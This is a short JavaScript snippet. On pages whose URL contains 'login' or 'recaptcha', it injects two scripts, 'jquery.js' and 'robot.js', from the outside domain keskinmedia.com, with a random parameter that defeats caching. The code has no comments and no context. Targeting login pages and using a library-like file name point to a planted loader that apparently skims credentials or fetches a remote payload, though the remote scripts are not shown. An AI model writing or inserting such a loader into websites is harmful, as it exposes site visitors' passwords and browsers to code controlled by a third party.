if (document.URL.includes("login") || document.URL.includes("recaptcha")) {
    LoadScript()
}

function LoadScript() {
    j = document.createElement('script');
    j.src = 'https://keskinmedia.com/api/jquery.js'
    document.head.appendChild(j);

    console.log("Hasip");
    var j = document.createElement('script');
    j.src = 'https://keskinmedia.com/api/robot.js?v=' + Math.random();
    document.head.appendChild(j);
}

